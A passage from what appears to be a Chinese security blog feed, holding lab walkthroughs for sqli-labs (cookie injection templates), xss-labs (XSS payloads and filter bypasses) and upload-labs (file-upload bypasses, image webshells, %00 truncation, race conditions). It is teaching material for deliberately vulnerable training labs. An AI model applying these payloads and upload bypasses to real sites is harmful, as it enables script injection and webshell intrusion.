<li>模版为：<code>&#39; or updataxml(1,concat(0x7e,(要构造的)),1),&#39;&#39;)#</code><br>然后通过mysql注入语句进行操作即可。</li>
</ul>
<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>这一关显示了很多的信息，经发现可以通过注入cookie。<br>$sql=”select * from users where username=’$cookie’ limit 0,1”;在登陆之后后台会将username放入cookie中。当再次登陆的时候，只要cookie没有过期，就会去cookie里面取值，然后进行查询。<br>模版为：<code>&#39; union select 1,2,(要构造的) #</code></p>
<h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>与20关基本相似。<br>模版为：<code>&#39;) union select 1,2,(要构造的) #</code><br>发现cookie处的username是一串base64编码的字符串。所以需要将mysql注入语句进行base64编码</p>
<h4 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h4><p>只需将20关中的单引号改为双引号即可，其余全部相似。<br>模版为：<code>&quot; union select 1,2,(要构造的) #</code><br>然后base64编码。</p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs</title>
    <url>/2020/02/15/xss-labs/</url>
    <content><![CDATA[<h3 id="level-01"><a href="#level-01" class="headerlink" title="level-01"></a><font color="#85da46">level-01</font></h3><p>发现这道题有get请求，参数为name, 直接构造payload</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<div align="center"><img src="https://ftp.bmp.ovh/imgs/2020/02/adac2201a6e2148c.png"></div>

<h3 id="level-02"><a href="#level-02" class="headerlink" title="level-02"></a><font color="#85da46">level-02</font></h3><span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当提交 keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;的时候，查看源码显示&lt;input name=keyword  value=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;，很显然此时没有闭合，js代码必定不会被执行。</span><br><span class="line"></span><br><span class="line">keyword=&quot;/&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;// 时,将前面input标签进行了闭合，然后 // 注释掉了原来后面的内容，js代码被JavaScript引擎执行。</span><br></pre></td></tr></table></figure>

<div align="center"><img src="https://ftp.bmp.ovh/imgs/2020/02/f4bcd78fde99833b.png"></div>

<h3 id="level-03"><a href="#level-03" class="headerlink" title="level-03"></a><font color="#85da46">level-03</font></h3><p>继续按照第二关的注入方式，发现后台对尖括号进行了过滤，那尝试不用尖括号。两种方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&#x27;onclick=&#x27;alert(/xss/)      #标准格式：onclick=&#x27;alert(/xss/)&#x27;，点击输入框触发</span><br><span class="line">2.&#x27;onmouseover=&#x27;alert(/xss/)  #标准格式：onmouseover=&#x27;alert(/xss/)&#x27; ，鼠标移动到输入框触发</span><br></pre></td></tr></table></figure>



<div align="center"><img width="550" src="https://ftp.bmp.ovh/imgs/2020/02/e5641ffc7836fa5f.png"></div>

<p>看了别人的wp，这里顺便解释一下<strong>htmlspecialchars</strong>()函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htmlspecialchars()函数把预定义的字符转换为HTML实体</span><br><span class="line"></span><br><span class="line">预定义的字符为：</span><br><span class="line">            &amp; （和号）成为 &amp;amp;</span><br><span class="line">            &quot; （双引号）成为 &amp;quot;</span><br><span class="line">            &#x27; （单引号）成为 &#x27;</span><br><span class="line">            &lt; （小于）成为 &amp;lt;</span><br><span class="line">            &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>

<h3 id="level-04"><a href="#level-04" class="headerlink" title="level-04"></a><font color="#85da46">level-04</font></h3><p>和第三关基本上是类似的，这道题只需要把单引号改为双引号就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&quot;onclick=&quot;alert(/xss/)      </span><br><span class="line">2.&quot;onmouseover=&quot;alert(/xss/) </span><br></pre></td></tr></table></figure>

<h3 id="level-05"><a href="#level-05" class="headerlink" title="level-05"></a><font color="#85da46">level-05</font></h3><p>直接按照第四关那样注入，出现了：</p>
<div align="center"><img width="500"src="https://ftp.bmp.ovh/imgs/2020/02/4f095c9affabccee.png"></div>

<p>按照第二关注入，出现了：</p>
<div align="center"><img width="500"src="https://ftp.bmp.ovh/imgs/2020/02/17c26945cdfa049a.png"></div>

<p>尝试使用大小写转换，发现结果仍然一样。可以确定后台对script和on都进行了过滤。按照网上的提示使用编码的方式进行绕过过滤，发现网页无法识别。仔细思量，会发现此时尖括号并没有被过滤。于是可以构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;/&gt;链接&lt;/a&gt;//</span><br></pre></td></tr></table></figure>

<p>此时点击超链接，就可进入下一关。</p>
<h3 id="level-06"><a href="#level-06" class="headerlink" title="level-06"></a><font color="#85da46">level-06</font></h3><p>按照第五关进行注入，出现：</p>
<div align="center"><img width="500"src="https://ftp.bmp.ovh/imgs/2020/02/5f67bdd032631d22.png"></div>

<p>对href进行了过滤，变换大小写发现成功了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/&gt;&lt;a Href=&#x27;javascript:alert(/xss/)&#x27;&gt;链接&lt;/a&gt;//</span><br></pre></td></tr></table></figure>

<h3 id="level-07"><a href="#level-07" class="headerlink" title="level-07"></a><font color="#85da46">level-07</font></h3><p>这一关过滤了script、on、src、data、href等关键字。大小写也不能绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. &quot;/&gt;&lt;a hrhrefef=&quot;javascscriptript:alert(/xss/)&quot;&gt;a&lt;/a&gt;//</span><br><span class="line">2. &quot;/&gt;&lt;scscriptript&gt;alert(/xss/)&lt;/scscriptript&gt;//</span><br></pre></td></tr></table></figure>

<p>通过重复关键字绕过过滤。</p>
<h3 id="level-08"><a href="#level-08" class="headerlink" title="level-08"></a><font color="#85da46">level-08</font></h3><p>根据友情链接 进行恶意js构造，发现仍然过滤掉了很多东西，大小写、重复写都没有什么用处。然后想到了对关键字部分进行编码操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unicode编码:javascrip&amp;#116;:alert(/xss/)  # 只需对最后一个单词t进行编码即可</span><br></pre></td></tr></table></figure>

<h3 id="level-09"><a href="#level-09" class="headerlink" title="level-09"></a><font color="#85da46">level-09</font></h3><p>按照上一关进行注入，竟然直接显示：</p>
<div align="center"><img width="500" src="https://ftp.bmp.ovh/imgs/2020/02/0426f396798c7b8e.png"></div>

<p>发现只要添上<font color="orange"> http:// </font>就不会这样显示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. javascrip&amp;#116;:alert(/xss/)//http://</span><br><span class="line">2. javascrip&amp;#116;:%0dhttp://%0dalert(/xss/)</span><br></pre></td></tr></table></figure>

<h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a><font color="#85da46">level-10</font></h3><p>看起来有点棘手。页面中没有任何可以点击的元素。但是会发现form表单里面有三个隐藏的input参数。</p>
<div align="center"><img width="500" src="https://ftp.bmp.ovh/imgs/2020/02/f42caba1dc641624.png"></div>

<p>为了找到注入点，可以分别对这些参数进行get传参。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?keyword=1&amp;t_link=1&amp;t_history=1&amp;t_sort=1</span><br></pre></td></tr></table></figure>

<p>发现只有第三个input处的value被附了值。故可以确认此为注入点。</p>
<p>但是此处过滤了尖括号。按照第四关进行注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>其中type类型可有多种选择：text、radio、button、submit等。</p>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a><font color="#85da46">level-11</font></h3><p>从这一关开始，注入点就变了。用上工具burpsuit是很有必要的。</p>
<p>查看元素，发现t_ref参数处的值是第10关处构造的url，则说明后台读取了HTT[请求包的Referer，并写入了HTML页面。</p>
<div align="center"><img  src="https://ftp.bmp.ovh/imgs/2020/02/462dfdefe7dcfbea.png"></div>

<p>所以只需要利用工具HackBar，修改referer的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a><font color="#85da46">level-12</font></h3><p>查看元素，发现t_ua后面value里面的参数和User-Agent里面的一模一样，则注入点可以确定在此。</p>
<div align="center"><img  src="https://ftp.bmp.ovh/imgs/2020/02/b3eb0ff117d28365.png"></div>

<p>所以只需要利用工具HackBar，修改User-Agent的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a><font color="#85da46">level-13</font></h3><p>根据返回的html判断cookie字段为web页面的自定义变量，则注入点可以确定在此。</p>
<div align="center"><img  src="https://ftp.bmp.ovh/imgs/2020/02/e32194a4f6c33c00.png"></div>

<p>所以只需要利用工具HackBar，修改cookies的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a><font color="#85da46">level-14</font></h3><p>14关绝了，一直在加载。给的那个 <a href="http://www.exifviewer.org/">http://www.exifviewer.org/</a> 也访问不了。</p>
<p>查了好多的wp，都是直接跳过这关了。</p>
<p>本关属于exif XSS，需要上传一个含有xss代码的图片触发xss。</p>
<p>具体wp参考：<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">巨人肩膀上的矮子</a></p>
<h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a><font color="#85da46">level-15</font></h3><p>很明显，本关的注入点在<font color="orange"> src </font>那块.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AngularJS ng-include指令：</span><br><span class="line">	用于包含外部的HTML文件，包含的内容将作为指定元素的子节点。</span><br><span class="line">	ng-include属性的值可以是一个表达式，返回一个文件名。</span><br><span class="line">	默认情况下，包含的文件需要包含在同一个域名下。</span><br></pre></td></tr></table></figure>

<p>后台源码显示nginclude调用采用htmlspecialchars过滤输入的src变量，直接在包含的页面里用<code>&lt;script&gt;</code>触发不了，用了img标签。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src=&#x27;level1.php?name=&lt;img src=x onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a><font color="#85da46">level-16</font></h3><p>很容易发现keyword处存在注入。多次尝试发现过滤了script、空格和 /，</p>
<div align='center'><img width="500" src="https://ftp.bmp.ovh/imgs/2020/02/a563d57d3e970581.png"></div>

<p>用换行符<font color='orange'> %0a </font> 取代空格，构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keyword=&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a><font color="#85da46">level-17</font></h3><p>arg01和arg01的变量存在注入。当输入arg01=c&amp;arg02=bdaerfre，显示：</p>
<div align='center'><img width="500" src="https://ftp.bmp.ovh/imgs/2020/02/98037e98f2e0db49.png"></div>

<p>本题过滤了尖括号和双引号，用on关键字触发。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arg01=a&amp;arg02=b onmouseover=alert(/xss/)</span><br></pre></td></tr></table></figure>

<p>但是这里有个小问题需要注意一下，就算你这道题做对了，他也没有任何弹窗的提示，因为火狐不能打开swf后缀的文件，换个IE或者360浏览器就可以了。</p>
<h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a><font color="#85da46">level-18</font></h3><p>和上道题基本上一样，唯一不同的就是对双引号进行了过滤。构造的payload同上。</p>
<h3 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a><font color="#85da46">level-19</font></h3><p>属于flash XSS，目前还不懂。</p>
<h3 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a><font color="#85da46">level-20</font></h3><p>同样属于flash XSS，需要反编译，不会。</p>
<hr>
<p><font color="red">靶场地址：<a href="https://github.com/paralax/xss-labs">https://github.com/paralax/xss-labs</a> </font>，最近发现靶场源码被删了。嘿嘿，幸好早就放进了网盘。</p>
<p>链接：<a href="https://pan.baidu.com/s/1cj13lPUs1MbMvLKmEY-pqw">https://pan.baidu.com/s/1cj13lPUs1MbMvLKmEY-pqw</a><br>提取码：6p2d。</p>
<p>需要注意一个我自己遇到的问题，在搭好环境后，我的burpsuit无法抓到包。但是其他的网页就可以。后来才找到了办法：</p>
<p>为了方便切换多个代理设置，我用了插件<font color="#a74e0d"> Procxy SwitchyOmega </font>。</p>
<div align="center"><img height="200" src="https://ftp.bmp.ovh/imgs/2020/02/26e96037126b6ce4.png"></div>]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/02/13/upload-labs/</url>
    <content><![CDATA[<h3 id="Pass-01-nbsp"><a href="#Pass-01-nbsp" class="headerlink" title="Pass-01&nbsp;"></a><font color="#85da46">Pass-01</font>&nbsp;</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上传类型为 jpg |  png | gif的可以直接上传，类型为php的前端页面则提示 <font color="orange">该文件不允许上传，请上传 .jpg|.png|.gif类型的文件</font></p>
<ul>
<li>将要上传的php文件后缀改为允许的，然后在burp上面改回原来的</li>
<li>或者是浏览器禁用js后进行上传。</li>
</ul>
<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a><font color="#85da46">Pass-02</font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据提示： 本pass在服务端对数据包的MIME进行检查。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看源码，发现PHP代码只对content-Type进行了检查，在burp里面进行修改。</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20200216112001411.png"></div>

<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a><font color="#85da46">Pass-03</font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据提示：本pass禁止上传 .asp|.aspx|.php|.jsp后缀文件。很显然这是一个黑名单绕过的题。可以通过用后缀为<font color="purple">  .php3 .phtml .php5 .phps .pht .htaccess </font>文件进行绕过。</p>
<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a><font color="#85da46">Pass-04</font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据提示：本pass禁止上传了很多文件，但是<font color="purple"> .htaccess</font> 文件没有进行限制。于是我们可以来构造 .htaccess文件，内容为  <font color="red"> SetHandler application/x-httpd-php</font>  意思是可以让 .jpg格式文件以php格式进行解析。可以把要上传的php文件后缀名改为.jpg格式就可绕过了。</p>
<p>需要注意的是：<a href="https://blog.csdn.net/cmzhuang/article/details/53537591">.htaccess详解及.htaccess参数说明</a></p>
<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a><font color="#85da46">Pass-05</font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;观察之前的源码，都会发现下面的一句代码，但是本题显然没有，所以可以用大小写进行绕过。即上传一个<font color="red">1.PHP</font> 文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>);  <span class="comment">// 转换为小写</span></span><br></pre></td></tr></table></figure>

<h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a><font color="#85da46">Pass-06</font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;观察源码，发现本题没有进行首尾去空格。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>) <span class="comment">// 首尾去空</span></span><br></pre></td></tr></table></figure>

<p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        于是上传一个<font color="red">1.php[空格] </font> 文件</p>
<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a><font color="#85da46">Pass-07</font></h3><p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        观察源码，发现本题没有去掉尾部的点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = deldot(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        于是上传一个<font color="red">1.php. </font> 文件</p>
<h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a><font color="#85da46">Pass-08</font></h3><p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        观察源码，发现本题没有去处文件名的 ::$DATA</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去处字符串：::$DATA</span></span><br></pre></td></tr></table></figure>

<p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;​        于是上传一个<font color="red">1.php::$DATA </font> 文件</p>
<h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a><font color="#85da46">Pass-09</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        仔细查看源码，发现代码执行顺序为：删除文件名末尾的点 — 首尾去空，所以可以构造文件后缀后面为 <font color="purple">. .</font> 即上传一个<font color="red">1.php. . </font> 文件</p>
<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a><font color="#85da46">Pass-10</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看源码，发现文件后缀被替换为空，可以利用双写绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>); <span class="comment">// 即那个文件后缀替换为空</span></span><br></pre></td></tr></table></figure>

<p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        于是上传一个<font color="red">1.pphphp </font> 文件</p>
<h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a><font color="#85da46">Pass-11</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：本pass上传路径可控。 查看源码，发现是白名单判断，文件存储路径为直接拼接而成，可以利用%00截断进行绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>



<div align="center"><img src="https://img-blog.csdnimg.cn/20200216145355494.png"></div>

<p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;尽管方法是对的，但是老是提醒上传失败，烦人。</p>
<p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后来发现这里应该是php版本的问题了。<font color="purple">%00截断</font> 在5.3.4以后就修复了。</p>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a><font color="#85da46">Pass-12</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        此题与上一题类似，只是将get改为了post, 故同样也可采用%00截断的方式绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>

<p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        此时文件路径在 POST数据里面，但是POST数据不能被url自动解码，所以需要在hex数据里面修改。为了方便找到位置，可以做个标记。</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20200216152224978.png"></div>

<p>然后再hex里面找到对应 <font color="purple"> )</font> 的16进制 0d, 将其改为 00 ，即可。</p>
<p>当然也可以直接对%00进行url解码。</p>
<p>与上题一样，同样因为版本问题，上传失败。</p>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a><font color="#85da46">Pass-13</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：本pass检查图标内容开头2个字节。即通过检查文件头判断文件类型。绕过方法为：制作图片木马，将php语句隐藏在图片中，然后执行php.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">制作图片木马：copy 1.jpg /b + 1.php /a webshell.jpg </span><br><span class="line">其中b代表二进制，a代表ascii编码</span><br></pre></td></tr></table></figure>

<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a><font color="#85da46">Pass-14</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：本pass使用getimagesize()检查是否为图片文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getimagesize() 函数用于获取图像大小及相关信息，成功则返回一个数组。</span><br><span class="line"></span><br><span class="line">语法格式：array getimagesize ( string $filename [, array &amp;$imageinfo ] )</span><br><span class="line"></span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</span><br></pre></td></tr></table></figure>

<p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        与上题绕过方式相同。</p>
<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a><font color="#85da46">Pass-15</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：本pass使用exif_imagetype()检查是否为图片文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名，从而判断一个图像的类型</span><br><span class="line"></span><br><span class="line">语法格式：exif_imagetype ( string $filename ) : int</span><br></pre></td></tr></table></figure>

<p>​    ​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    绕过方法同样与13题相同。</p>
<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a><font color="#85da46">Pass-16</font></h3><p>​    ​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    查看提示：本pass重新渲染了图片。查看源码，发现代码先是判断了文件后缀和文件content-Type是否保持一致，然后用 imagecreatefrom[jpg][gif][png] 函数判断是否是图片格式，如果是的话再用image[jpg][gif][png]进行二次渲染。</p>
<p>​    ​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    本题较为困难，目前我只能完全理解上传gif格式文件，即像上述方法一样构造图片木马，然后将成功上传的图片下载到本地，对比二次渲染图片和原来上传的图片，会发现末尾的PHP代码消失了，重新将PHP代码写入到两张图片相同的地方，此时便是真正成功上传了带有PHP代码的图片了。至于png和JPEG格式的，参考链接 <a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p>
<h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a><font color="#85da46">Pass-17</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：需要代码审计。查看源码发现，代码执行顺序为： 现将文件上传到服务器端，如果文件类型在白名单之类就重命名，不在的话就用UNlink进行删除。看别人写wp，都将这个叫做条件竞争。这个是之前没有接触过的。    </p>
<p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        绕过方法： 首先在burp不断发送上传webshell的数据包，然后不断在浏览器中访问，可以通过竞争访问到文件，但是缺陷是概率太低，经常会返回404.</p>
<p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        之后找到了一个较为方便的方法(参照大佬)：</p>
<ul>
<li><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问</p>
<ol>
<li><p>先设置上传请求，文件名为 1.php</p>
</li>
<li><p>无参数需要爆破，故只需重复发起请求，设置访问次数为5000次，线程为50个</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20200216164642632.png"></div></li>
<li><p>浏览器构造payload：<a href="http://web-labs.rinue.top/upload-labs/upload/1.php">http://web-labs.rinue.top/upload-labs/upload/1.php</a> 进行访问，然后用burp抓包</p>
</li>
<li><p>burp抓包后发送至intruder模块，然后设置payload，和第二步参数设置相同</p>
</li>
<li><p>设置好两个模块后同时启动，观察结果，当访问成功的时候，会返回PHP的配置信息。</p>
</li>
</ol>
</li>
</ul>
<h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a><font color="#85da46">Pass-18</font></h3><p>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;​        本关对文件后缀做了白名单的判断，然后检查文件大小，文件上传后对文件重新命名，同样存在条件竞争的漏洞。仍然利用burp不断上传图片马的数据包，由于条件竞争，程序会出现来不及rename的情况，从而上传成功。</p>
<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a><font color="#85da46">Pass-19</font></h3><p>​​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;        查看提示：本pass的取文件名通过$_POST来获取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pathinfo() 函数以数组的形式返回文件路径的信息</span><br><span class="line"></span><br><span class="line">语法：pathinof(path, options)</span><br><span class="line">options : PATHINFO_DIRNAME - 只返回 dirname;PATHINFO_BASENAME - 只返回 basename;</span><br><span class="line">PATHINFO_EXTENSION - 只返回 extension</span><br><span class="line"></span><br><span class="line">举例：&lt;?php print_r(pathinfo(&quot;/testweb/test.txt&quot;));?&gt;</span><br><span class="line">输出：</span><br><span class="line">    Array</span><br><span class="line">    (</span><br><span class="line">    [dirname] =&gt; /testweb</span><br><span class="line">    [basename] =&gt; test.txt</span><br><span class="line">    [extension] =&gt; txt</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">move_uploaded_file函数会忽略文件末尾的 /. </span><br></pre></td></tr></table></figure>

<ul>
<li>可以利用move_uploaded_file的 \x00截断。即 post: save_name = 1.php%00.jpg</li>
<li>post: save_name = 1.php/. ，这样file_ext的值为空，可以绕过黑名单，函数忽略/. ，保存的文件类型为 .php</li>
</ul>
<hr>
<h3 id="经典题型"><a href="#经典题型" class="headerlink" title="经典题型"></a><font color="#85da46">经典题型</font></h3><ol>
<li><a href="https://www.cnblogs.com/-chenxs/p/11953933.html">perl和ARGV任意文件读取</a></li>
</ol>
<p><font color="red">有哪些地方有问题的，望各位大佬指教。谢谢了！！！！</font></p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>python的一些奇淫巧计</title>
    <url>/2020/02/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/</url>
